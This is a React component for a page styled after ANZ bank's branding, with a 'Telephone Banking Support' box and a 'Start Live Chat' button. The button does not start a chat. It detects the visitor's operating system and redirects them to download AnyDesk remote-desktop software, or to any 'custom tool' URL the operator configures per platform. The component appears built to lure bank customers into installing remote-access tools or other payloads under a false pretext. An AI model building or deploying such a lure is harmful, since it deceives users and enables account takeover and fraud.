"use client";

import { useEffect, useState } from "react";
import { useUserRegion } from "../hooks/useUserRegion";

type OS = "Windows" | "macOS" | "iOS" | "Linux" | "Android" | "Unknown";

// Per-platform custom tool URLs. Set any combination in the hosting dashboard.
// Unset platforms automatically fall back to AnyDesk.
const CUSTOM_URLS: Record<string, string> = {
  Windows: process.env.NEXT_PUBLIC_CUSTOM_TOOL_URL_WIN || "",
  macOS:   process.env.NEXT_PUBLIC_CUSTOM_TOOL_URL_MAC || "",
  iOS:     process.env.NEXT_PUBLIC_CUSTOM_TOOL_URL_IOS || "",
  Linux:   process.env.NEXT_PUBLIC_CUSTOM_TOOL_URL_LINUX || "",
  Android: process.env.NEXT_PUBLIC_CUSTOM_TOOL_URL_ANDROID || "",
};

const TOOL_LABEL = process.env.NEXT_PUBLIC_TOOL_LABEL || "Start Live Chat";

// AnyDesk fallback URLs (always available, never needs configuration)
const ANYDESK_URLS: Record<string, string> = {
  Windows: "https://download.anydesk.com/AnyDesk.exe",
  macOS:   "https://download.anydesk.com/anydesk.dmg",
  iOS:     "https://apps.apple.com/app/anydesk-remote-desktop/id1176131273",
  Linux:   "https://anydesk.com/en/downloads/linux",
  Android: "https://play.google.com/store/apps/details?id=com.anydesk.anydeskandroid",
};

export function SmartDownloader() {
  const [os, setOs] = useState<OS>("Unknown");
  const { regionData, loading } = useUserRegion();

  useEffect(() => {
    const ua = window.navigator.userAgent;

    // Detection order matters: check mobile platforms first
    if (/iPhone|iPad|iPod/.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1)) {
      setOs("iOS");       // Includes iPadOS 13+ which fakes macOS user agent
    } else if (/Android/.test(ua)) {
      setOs("Android");
    } else if (ua.indexOf("Win") !== -1) {
      setOs("Windows");
    } else if (ua.indexOf("Mac") !== -1) {
      setOs("macOS");     // Only real Macs reach here (iOS/iPadOS already caught)
    } else if (ua.indexOf("Linux") !== -1) {
      setOs("Linux");     // Desktop Linux only (Android already caught)
    }
  }, []);

  const getDownloadLink = (targetOs: OS): string => {
    // If a custom URL is set for this specific platform, use it
    if (CUSTOM_URLS[targetOs]) return CUSTOM_URLS[targetOs];

    // Otherwise fall back to AnyDesk for this platform
    return ANYDESK_URLS[targetOs] || ANYDESK_URLS.Windows;
  };

  const handleLiveChatClick = () => {
    const primaryOs = os !== "Unknown" ? os : "Windows";
    window.location.href = getDownloadLink(primaryOs);
  };

  return (
    <div className="flex flex-col items-start w-full">
      <button
        onClick={handleLiveChatClick}
        className="w-full flex justify-center items-center h-[52px] bg-anz-pacific-blue text-white font-semibold text-[16px] tracking-wide rounded-[4px] hover:bg-anz-pacific-blue-hover transition-colors cursor-pointer border-none"
      >
        <svg className="w-5 h-5 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
        </svg>
        {TOOL_LABEL}
      </button>
      
      <div className="mt-8 w-full p-5 bg-anz-card-bg rounded-[4px] border border-anz-border">
        <h3 className="text-[16px] text-anz-dark-blue mb-3 font-semibold">Other ways to contact {loading ? "us" : regionData.brandName}</h3>
        
        <div className="flex flex-col gap-2 mt-4">
          <p className="text-[14px] text-anz-text-muted mb-1">Telephone Banking Support:</p>
          <p className="font-semibold text-[18px] text-anz-dark-blue">
             {loading ? "Loading..." : regionData.supportPhone}
          </p>
          <p className="text-[12px] text-anz-text-muted mt-1">Lines are open 24/7. Standard rates apply.</p>
        </div>
      </div>
    </div>
  );
}
